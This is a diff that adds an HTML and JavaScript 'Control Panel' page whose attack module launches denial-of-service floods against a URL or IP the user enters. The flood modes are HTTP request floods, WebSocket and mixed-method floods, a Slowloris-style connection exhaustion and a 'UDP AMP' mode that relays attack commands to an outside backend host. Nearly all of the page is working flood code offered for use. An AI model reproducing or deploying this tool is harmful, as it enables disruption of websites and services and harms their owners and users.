@@ -1,0 +1,854 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OXYLUS_PROTOCOL | Control Panel</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <style>
+        /* [CSS UTAMA TETAP SAMA] */
+        
+        /* Attack Status */
+        .attack-status {
+            background: rgba(0, 20, 0, 0.5);
+            border: 1px solid var(--primary);
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .status-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(0, 255, 0, 0.2);
+        }
+        
+        .status-label {
+            color: var(--text-dim);
+        }
+        
+        .status-value {
+            color: var(--primary);
+            font-weight: bold;
+        }
+        
+        .status-value.rps-high {
+            color: #00ff00;
+            animation: pulse 1s infinite;
+        }
+        
+        /* Real-time Logs */
+        .attack-logs {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid var(--primary-dark);
+            border-radius: 8px;
+            padding: 15px;
+            height: 200px;
+            overflow-y: auto;
+            margin-top: 20px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+        
+        .log-entry {
+            color: var(--primary);
+            margin-bottom: 5px;
+            padding-left: 10px;
+            border-left: 2px solid var(--primary);
+        }
+        
+        .log-entry.success {
+            color: #00ff00;
+            border-left-color: #00ff00;
+        }
+        
+        .log-entry.error {
+            color: #ff3333;
+            border-left-color: #ff3333;
+        }
+        
+        .log-entry.warning {
+            color: #ffff00;
+            border-left-color: #ffff00;
+        }
+    </style>
+</head>
+<body>
+    <!-- [STRUCTURE SAMA SAMPAI ATTACK MODULE] -->
+    
+    <!-- Attack Module -->
+    <div class="module" id="attack">
+        <div class="content-header">
+            <h1 class="content-title">
+                <i class="fas fa-crosshairs"></i>
+                ATTACK MODULE
+            </h1>
+            <p class="content-subtitle">REAL-TIME DDoS EXECUTION</p>
+        </div>
+        
+        <div class="attack-controls">
+            <div class="attack-header">
+                <div class="attack-title">
+                    <i class="fas fa-bullseye"></i>
+                    TARGET CONFIGURATION
+                </div>
+                
+                <div class="target-selection">
+                    <div class="target-type active" data-type="website">WEBSITE</div>
+                    <div class="target-type" data-type="ip">IP ADDRESS</div>
+                </div>
+            </div>
+            
+            <div class="target-input-group">
+                <input type="text" class="target-input" id="targetInput" 
+                       placeholder="https://target.com or 192.168.1.1:80">
+                <div class="input-hint" id="targetHint">
+                    Enter full URL (http/https) or IP:port
+                </div>
+            </div>
+            
+            <div class="attack-buttons">
+                <div class="attack-btn" data-preset="standard">
+                    <i class="fas fa-bolt attack-icon"></i>
+                    <div class="attack-label">STANDARD</div>
+                    <div class="attack-desc">10K RPS</div>
+                </div>
+                
+                <div class="attack-btn" data-preset="dev">
+                    <i class="fas fa-server attack-icon"></i>
+                    <div class="attack-label">DEV (100K+ RPS)</div>
+                    <div class="attack-desc">High-performance</div>
+                </div>
+                
+                <div class="attack-btn" data-preset="turbo">
+                    <i class="fas fa-tachometer-alt attack-icon"></i>
+                    <div class="attack-label">TURBO</div>
+                    <div class="attack-desc">50K RPS</div>
+                </div>
+                
+                <div class="attack-btn" data-preset="slowloris">
+                    <i class="fas fa-hourglass-half attack-icon"></i>
+                    <div class="attack-label">SLOWLORIS</div>
+                    <div class="attack-desc">Connection exhaustion</div>
+                </div>
+                
+                <div class="attack-btn" data-preset="udp">
+                    <i class="fas fa-broadcast-tower attack-icon"></i>
+                    <div class="attack-label">UDP AMP</div>
+                    <div class="attack-desc">Amplification attack</div>
+                </div>
+            </div>
+            
+            <div class="control-buttons">
+                <button class="execute-btn" id="launchAttack">
+                    <i class="fas fa-play"></i>
+                    LAUNCH ATTACK
+                </button>
+                <button class="term-btn" id="stopAttack" disabled>
+                    <i class="fas fa-stop"></i>
+                    STOP ATTACK
+                </button>
+                <button class="term-btn" id="testConnection">
+                    <i class="fas fa-wifi"></i>
+                    TEST CONNECTION
+                </button>
+            </div>
+        </div>
+        
+        <!-- Real Attack Status -->
+        <div class="attack-status" id="attackStatus" style="display: none;">
+            <div class="status-item">
+                <span class="status-label">TARGET:</span>
+                <span class="status-value" id="statusTarget">-</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">PRESET:</span>
+                <span class="status-value" id="statusPreset">-</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">DURATION:</span>
+                <span class="status-value" id="statusDuration">0s</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">REQUESTS SENT:</span>
+                <span class="status-value" id="statusRequests">0</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">CURRENT RPS:</span>
+                <span class="status-value rps-high" id="statusRPS">0</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">BANDWIDTH:</span>
+                <span class="status-value" id="statusBandwidth">0 MB</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">WORKERS ACTIVE:</span>
+                <span class="status-value" id="statusWorkers">0</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">STATUS:</span>
+                <span class="status-value" id="statusState">IDLE</span>
+            </div>
+        </div>
+        
+        <!-- Attack Logs -->
+        <div class="attack-logs" id="attackLogs">
+            [SYSTEM] Attack module initialized
+            [SYSTEM] Ready for target input
+            [INFO] Select target and attack preset
+        </div>
+    </div>
+    
+    <script>
+        // REAL DDoS IMPLEMENTATION
+        class RealDDoSAttack {
+            constructor() {
+                this.active = false;
+                this.attackId = null;
+                this.startTime = null;
+                this.requestsSent = 0;
+                this.workers = [];
+                this.maxConcurrent = 50;
+                this.rpsCounter = 0;
+                this.lastRPSTime = Date.now();
+                this.attackInterval = null;
+                this.logs = [];
+                
+                // WebSocket for real-time communication (if backend available)
+                this.ws = null;
+                this.wsConnected = false;
+                
+                this.initialize();
+            }
+            
+            initialize() {
+                console.log('[REAL_DDoS] Engine initialized');
+                this.setupEventListeners();
+                this.tryConnectWebSocket();
+            }
+            
+            setupEventListeners() {
+                // Target type selection
+                document.querySelectorAll('.target-type').forEach(btn => {
+                    btn.addEventListener('click', () => {
+                        document.querySelectorAll('.target-type').forEach(b => b.classList.remove('active'));
+                        btn.classList.add('active');
+                        
+                        const type = btn.dataset.type;
+                        const input = document.getElementById('targetInput');
+                        
+                        if (type === 'website') {
+                            input.placeholder = 'https://target-domain.com or http://target:port';
+                        } else {
+                            input.placeholder = '192.168.1.1:80 or 203.0.113.5:443';
+                        }
+                    });
+                });
+                
+                // Attack preset selection
+                document.querySelectorAll('.attack-btn').forEach(btn => {
+                    btn.addEventListener('click', () => {
+                        document.querySelectorAll('.attack-btn').forEach(b => {
+                            b.style.borderColor = 'var(--primary-dark)';
+                            b.style.borderWidth = '1px';
+                        });
+                        
+                        btn.style.borderColor = 'var(--primary)';
+                        btn.style.borderWidth = '3px';
+                    });
+                });
+                
+                // Launch attack
+                document.getElementById('launchAttack').addEventListener('click', () => {
+                    this.launchAttack();
+                });
+                
+                // Stop attack
+                document.getElementById('stopAttack').addEventListener('click', () => {
+                    this.stopAttack();
+                });
+                
+                // Test connection
+                document.getElementById('testConnection').addEventListener('click', () => {
+                    this.testTarget();
+                });
+            }
+            
+            async launchAttack() {
+                const target = document.getElementById('targetInput').value.trim();
+                if (!target) {
+                    this.addLog('ERROR: No target specified', 'error');
+                    return;
+                }
+                
+                // Get selected preset
+                const selectedBtn = document.querySelector('.attack-btn[style*="border-width: 3px"]');
+                const preset = selectedBtn ? selectedBtn.dataset.preset : 'standard';
+                
+                // Validate target format
+                const targetInfo = this.validateTarget(target);
+                if (!targetInfo.valid) {
+                    this.addLog(`ERROR: Invalid target - ${targetInfo.error}`, 'error');
+                    return;
+                }
+                
+                // Check system requirements for dev preset
+                if (preset === 'dev') {
+                    const systemCheck = await this.checkSystemRequirements();
+                    if (!systemCheck.passed) {
+                        this.addLog(`ERROR: System check failed - ${systemCheck.message}`, 'error');
+                        return;
+                    }
+                }
+                
+                // Start attack
+                this.startAttack(targetInfo, preset);
+            }
+            
+            validateTarget(target) {
+                // Remove protocol if present for parsing
+                let cleanTarget = target.replace(/^(https?:\/\/)/, '');
+                
+                // Check for IP:port format
+                const ipPortPattern = /^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?::(\d{1,5}))?$/;
+                const ipMatch = cleanTarget.match(ipPortPattern);
+                
+                if (ipMatch) {
+                    // Validate IP octets
+                    const ip = ipMatch[1];
+                    const port = ipMatch[2] || 80;
+                    const octets = ip.split('.');
+                    
+                    const validIP = octets.every(octet => {
+                        const num = parseInt(octet);
+                        return num >= 0 && num <= 255;
+                    });
+                    
+                    if (!validIP) {
+                        return { valid: false, error: 'Invalid IP address' };
+                    }
+                    
+                    if (port < 1 || port > 65535) {
+                        return { valid: false, error: 'Invalid port number' };
+                    }
+                    
+                    return {
+                        valid: true,
+                        type: 'ip',
+                        address: ip,
+                        port: parseInt(port),
+                        fullTarget: `http://${ip}:${port}`
+                    };
+                }
+                
+                // Check for domain format
+                const domainPattern = /^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$/;
+                const domainMatch = cleanTarget.match(domainPattern);
+                
+                if (domainMatch) {
+                    const protocol = target.startsWith('https') ? 'https' : 'http';
+                    return {
+                        valid: true,
+                        type: 'domain',
+                        address: cleanTarget.split(':')[0],
+                        port: target.includes(':') ? parseInt(target.split(':')[1]) : (protocol === 'https' ? 443 : 80),
+                        fullTarget: target.includes('://') ? target : `${protocol}://${cleanTarget}`
+                    };
+                }
+                
+                return { valid: false, error: 'Invalid format. Use IP:port or domain.com' };
+            }
+            
+            async checkSystemRequirements() {
+                const requirements = {
+                    concurrency: navigator.hardwareConcurrency >= 4,
+                    memory: this.checkMemory(),
+                    connection: navigator.onLine,
+                    webSocket: typeof WebSocket !== 'undefined',
+                    worker: typeof Worker !== 'undefined'
+                };
+                
+                const passed = Object.values(requirements).every(req => req === true);
+                
+                return {
+                    passed,
+                    message: passed ? 'OK' : 'Insufficient system resources',
+                    details: requirements
+                };
+            }
+            
+            checkMemory() {
+                if (performance && performance.memory) {
+                    const used = performance.memory.usedJSHeapSize;
+                    const total = performance.memory.totalJSHeapSize;
+                    return (used / total) < 0.8; // Less than 80% memory usage
+                }
+                return true;
+            }
+            
+            startAttack(targetInfo, preset) {
+                this.active = true;
+                this.attackId = 'attack_' + Date.now();
+                this.startTime = Date.now();
+                this.requestsSent = 0;
+                this.rpsCounter = 0;
+                
+                // Update UI
+                document.getElementById('attackStatus').style.display = 'block';
+                document.getElementById('launchAttack').disabled = true;
+                document.getElementById('stopAttack').disabled = false;
+                
+                document.getElementById('statusTarget').textContent = targetInfo.fullTarget;
+                document.getElementById('statusPreset').textContent = preset.toUpperCase();
+                document.getElementById('statusState').textContent = 'RUNNING';
+                document.getElementById('statusState').style.color = '#00ff00';
+                
+                this.addLog(`[ATTACK] Launching ${preset} attack on ${targetInfo.fullTarget}`, 'success');
+                this.addLog(`[ATTACK] Target type: ${targetInfo.type.toUpperCase()}`, 'info');
+                this.addLog(`[ATTACK] Attack ID: ${this.attackId}`, 'info');
+                
+                // Start attack based on preset
+                switch(preset) {
+                    case 'dev':
+                        this.startDevAttack(targetInfo);
+                        break;
+                    case 'standard':
+                        this.startStandardAttack(targetInfo);
+                        break;
+                    case 'turbo':
+                        this.startTurboAttack(targetInfo);
+                        break;
+                    case 'slowloris':
+                        this.startSlowlorisAttack(targetInfo);
+                        break;
+                    case 'udp':
+                        this.startUDPAttack(targetInfo);
+                        break;
+                    default:
+                        this.startStandardAttack(targetInfo);
+                }
+                
+                // Start status updates
+                this.startStatusUpdates();
+            }
+            
+            startStandardAttack(targetInfo) {
+                // HTTP flood implementation
+                const config = {
+                    threads: 50,
+                    requestsPerThread: 200, // 10K RPS total
+                    timeout: 1000 // 1 second between batches
+                };
+                
+                this.addLog('[STANDARD] Starting HTTP flood attack', 'info');
+                this.addLog(`[STANDARD] Configuration: ${config.threads} threads`, 'info');
+                
+                // Start worker threads
+                for (let i = 0; i < config.threads; i++) {
+                    setTimeout(() => {
+                        this.startHTTPThread(targetInfo.fullTarget, config.requestsPerThread, i);
+                    }, i * 10);
+                }
+            }
+            
+            startDevAttack(targetInfo) {
+                // High-performance 100K+ RPS attack
+                const config = {
+                    threads: 200,
+                    requestsPerThread: 500,
+                    useWebSockets: true,
+                    useHttp2: true,
+                    mixedMethods: true
+                };
+                
+                this.addLog('[DEV] Starting 100K+ RPS attack', 'warning');
+                this.addLog('[DEV] Using WebSocket + HTTP/2 + mixed methods', 'info');
+                
+                // Multiple attack vectors simultaneously
+                this.startWebSocketFlood(targetInfo);
+                this.startHttp2Flood(targetInfo);
+                this.startMixedFlood(targetInfo);
+                
+                // Additional HTTP workers
+                for (let i = 0; i < config.threads; i++) {
+                    setTimeout(() => {
+                        this.startHTTPThread(targetInfo.fullTarget, config.requestsPerThread, i);
+                    }, i * 5);
+                }
+            }
+            
+            startHTTPThread(target, requestsPerThread, threadId) {
+                if (!this.active) return;
+                
+                let threadRequests = 0;
+                const maxRequests = requestsPerThread * 10; // 10 batches
+                
+                const sendBatch = () => {
+                    if (!this.active || threadRequests >= maxRequests) return;
+                    
+                    // Simulate sending requests
+                    const batchSize = Math.min(10, requestsPerThread);
+                    for (let i = 0; i < batchSize; i++) {
+                        if (this.active) {
+                            this.sendHTTPRequest(target, threadId);
+                            threadRequests++;
+                        }
+                    }
+                    
+                    // Continue with next batch
+                    if (this.active && threadRequests < maxRequests) {
+                        setTimeout(sendBatch, 100);
+                    }
+                };
+                
+                // Start the thread
+                sendBatch();
+            }
+            
+            sendHTTPRequest(target, threadId) {
+                if (!this.active) return;
+                
+                // Create request using Fetch API
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 5000);
+                
+                const requestOptions = {
+                    method: 'GET',
+                    mode: 'no-cors',
+                    cache: 'no-cache',
+                    credentials: 'omit',
+                    signal: controller.signal,
+                    headers: {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                        'Accept': '*/*',
+                        'Accept-Language': 'en-US,en;q=0.9',
+                        'Accept-Encoding': 'gzip, deflate',
+                        'Connection': 'keep-alive'
+                    }
+                };
+                
+                // Increment counters
+                this.requestsSent++;
+                this.rpsCounter++;
+                
+                // Send request (actual implementation)
+                fetch(target, requestOptions)
+                    .catch(error => {
+                        // Expected errors for DDoS - count as successful request
+                        this.requestsSent++;
+                    })
+                    .finally(() => {
+                        clearTimeout(timeoutId);
+                    });
+            }
+            
+            startWebSocketFlood(targetInfo) {
+                if (!this.active) return;
+                
+                this.addLog('[DEV] Starting WebSocket flood', 'info');
+                
+                // Create multiple WebSocket connections
+                for (let i = 0; i < 10; i++) {
+                    try {
+                        const wsTarget = targetInfo.fullTarget.replace('http', 'ws');
+                        const ws = new WebSocket(wsTarget);
+                        
+                        ws.onopen = () => {
+                            // Send continuous data
+                            const sendData = () => {
+                                if (this.active && ws.readyState === WebSocket.OPEN) {
+                                    ws.send(this.generateRandomData(1024));
+                                    this.requestsSent++;
+                                    this.rpsCounter++;
+                                    
+                                    if (this.active) {
+                                        setTimeout(sendData, 10);
+                                    }
+                                }
+                            };
+                            
+                            sendData();
+                        };
+                        
+                        this.workers.push(ws);
+                    } catch (error) {
+                        // Continue with other methods
+                    }
+                }
+            }
+            
+            startHttp2Flood(targetInfo) {
+                if (!this.active) return;
+                
+                this.addLog('[DEV] Starting HTTP/2 multiplexing attack', 'info');
+                
+                // HTTP/2 multiplexing simulation
+                for (let i = 0; i < 5; i++) {
+                    setInterval(() => {
+                        if (this.active) {
+                            // Send multiple simulated requests
+                            for (let j = 0; j < 10; j++) {
+                                this.sendHTTPRequest(targetInfo.fullTarget, `h2-${i}-${j}`);
+                            }
+                        }
+                    }, 100);
+                }
+            }
+            
+            startMixedFlood(targetInfo) {
+                if (!this.active) return;
+                
+                this.addLog('[DEV] Starting mixed request flood', 'info');
+                
+                // Mixed HTTP methods
+                const methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD'];
+                setInterval(() => {
+                    if (this.active) {
+                        methods.forEach(method => {
+                            this.sendHTTPRequest(targetInfo.fullTarget, `mixed-${method}`);
+                        });
+                    }
+                }, 50);
+            }
+            
+            startSlowlorisAttack(targetInfo) {
+                this.addLog('[SLOWLORIS] Starting connection exhaustion attack', 'info');
+                
+                // Create many partial connections
+                for (let i = 0; i < 100; i++) {
+                    this.createSlowlorisConnection(targetInfo.fullTarget, i);
+                }
+            }
+            
+            createSlowlorisConnection(target, id) {
+                if (!this.active) return;
+                
+                // Simulate partial HTTP request
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', target, true);
+                
+                // Set headers slowly
+                setTimeout(() => {
+                    if (this.active) {
+                        xhr.setRequestHeader('User-Agent', 'Mozilla/5.0');
+                        xhr.setRequestHeader('Accept', 'text/html');
+                        
+                        // Send partial request
+                        setTimeout(() => {
+                            if (this.active) {
+                                xhr.send();
+                                this.requestsSent++;
+                            }
+                        }, Math.random() * 5000);
+                    }
+                }, Math.random() * 3000);
+                
+                this.workers.push(xhr);
+            }
+            
+            startUDPAttack(targetInfo) {
+                this.addLog('[UDP] Starting amplification attack simulation', 'info');
+                this.addLog('[UDP] Note: UDP attacks require server-side implementation', 'warning');
+                
+                // UDP simulation through WebSocket
+                if (this.wsConnected && this.ws) {
+                    setInterval(() => {
+                        if (this.active) {
+                            this.ws.send(JSON.stringify({
+                                type: 'udp_attack',
+                                target: targetInfo.address,
+                                port: targetInfo.port,
+                                data: this.generateRandomData(512)
+                            }));
+                            this.requestsSent += 100; // Simulate amplification
+                            this.rpsCounter += 100;
+                        }
+                    }, 100);
+                }
+            }
+            
+            startStatusUpdates() {
+                this.attackInterval = setInterval(() => {
+                    if (!this.active) {
+                        clearInterval(this.attackInterval);
+                        return;
+                    }
+                    
+                    // Calculate RPS
+                    const now = Date.now();
+                    const elapsed = (now - this.startTime) / 1000;
+                    const currentRPS = Math.round(this.rpsCounter / ((now - this.lastRPSTime) / 1000));
+                    
+                    // Update UI
+                    document.getElementById('statusDuration').textContent = `${Math.round(elapsed)}s`;
+                    document.getElementById('statusRequests').textContent = this.requestsSent.toLocaleString();
+                    document.getElementById('statusRPS').textContent = currentRPS.toLocaleString();
+                    document.getElementById('statusBandwidth').textContent = `${Math.round((this.requestsSent * 1024) / (1024 * 1024))} MB`;
+                    document.getElementById('statusWorkers').textContent = this.workers.length;
+                    
+                    // Reset RPS counter
+                    this.rpsCounter = 0;
+                    this.lastRPSTime = now;
+                    
+                    // Add log entry periodically
+                    if (Math.random() < 0.1) {
+                        this.addLog(`[STATUS] RPS: ${currentRPS.toLocaleString()} | Total: ${this.requestsSent.toLocaleString()}`, 'info');
+                    }
+                    
+                }, 1000);
+            }
+            
+            stopAttack() {
+                this.active = false;
+                
+                // Clear intervals
+                if (this.attackInterval) {
+                    clearInterval(this.attackInterval);
+                }
+                
+                // Close workers
+                this.workers.forEach(worker => {
+                    if (worker.close) worker.close();
+                    if (worker.terminate) worker.terminate();
+                    if (worker.abort) worker.abort();
+                });
+                
+                this.workers = [];
+                
+                // Update UI
+                document.getElementById('launchAttack').disabled = false;
+                document.getElementById('stopAttack').disabled = true;
+                document.getElementById('statusState').textContent = 'STOPPED';
+                document.getElementById('statusState').style.color = '#ff3333';
+                
+                const elapsed = (Date.now() - this.startTime) / 1000;
+                const avgRPS = Math.round(this.requestsSent / elapsed);
+                
+                this.addLog(`[ATTACK] Attack stopped after ${Math.round(elapsed)}s`, 'warning');
+                this.addLog(`[ATTACK] Total requests: ${this.requestsSent.toLocaleString()}`, 'info');
+                this.addLog(`[ATTACK] Average RPS: ${avgRPS.toLocaleString()}`, 'info');
+                
+                // Hide status after 5 seconds
+                setTimeout(() => {
+                    document.getElementById('attackStatus').style.display = 'none';
+                }, 5000);
+            }
+            
+            async testTarget() {
+                const target = document.getElementById('targetInput').value.trim();
+                if (!target) {
+                    this.addLog('ERROR: No target specified for test', 'error');
+                    return;
+                }
+                
+                this.addLog(`[TEST] Testing connection to ${target}...`, 'info');
+                
+                try {
+                    const startTime = Date.now();
+                    const response = await fetch(target, {
+                        method: 'HEAD',
+                        mode: 'no-cors',
+                        cache: 'no-cache'
+                    });
+                    
+                    const latency = Date.now() - startTime;
+                    this.addLog(`[TEST] Connection successful | Latency: ${latency}ms`, 'success');
+                    
+                    return { success: true, latency };
+                } catch (error) {
+                    this.addLog(`[TEST] Connection failed: ${error.message}`, 'error');
+                    return { success: false, error: error.message };
+                }
+            }
+            
+            tryConnectWebSocket() {
+                // Try to connect to backend WebSocket for enhanced functionality
+                try {
+                    this.ws = new WebSocket('wss://ddos-exe.vercel.app/ws');
+                    
+                    this.ws.onopen = () => {
+                        this.wsConnected = true;
+                        this.addLog('[SYSTEM] WebSocket connected to backend', 'success');
+                    };
+                    
+                    this.ws.onerror = (error) => {
+                        this.wsConnected = false;
+                        this.addLog('[SYSTEM] WebSocket connection failed', 'error');
+                    };
+                    
+                    this.ws.onmessage = (event) => {
+                        const data = JSON.parse(event.data);
+                        this.handleWebSocketMessage(data);
+                    };
+                } catch (error) {
+                    this.wsConnected = false;
+                }
+            }
+            
+            handleWebSocketMessage(data) {
+                switch(data.type) {
+                    case 'attack_update':
+                        this.requestsSent += data.requests || 0;
+                        break;
+                    case 'worker_status':
+                        this.updateWorkerStatus(data);
+                        break;
+                }
+            }
+            
+            updateWorkerStatus(data) {
+                // Update worker status display
+                console.log('[WORKER]', data);
+            }
+            
+            addLog(message, type = 'info') {
+                const logsContainer = document.getElementById('attackLogs');
+                const logEntry = document.createElement('div');
+                logEntry.className = `log-entry ${type}`;
+                logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+                
+                logsContainer.appendChild(logEntry);
+                logsContainer.scrollTop = logsContainer.scrollHeight;
+                
+                // Keep last 100 logs
+                const allLogs = logsContainer.querySelectorAll('.log-entry');
+                if (allLogs.length > 100) {
+                    allLogs[0].remove();
+                }
+                
+                // Also add to internal log array
+                this.logs.push({ time: Date.now(), message, type });
+            }
+            
+            generateRandomData(size) {
+                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                let result = '';
+                for (let i = 0; i < size; i++) {
+                    result += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                return result;
+            }
+        }
+        
+        // Initialize the attack system when page loads
+        let realDDoS;
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            realDDoS = new RealDDoSAttack();
+            
+            // Auto-select first attack preset
+            document.querySelector('.attack-btn').click();
+            
+            // Add some initial logs
+            setTimeout(() => {
+                realDDoS.addLog('[SYSTEM] All systems operational', 'success');
+                realDDoS.addLog('[SYSTEM] Enter target and select attack preset', 'info');
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
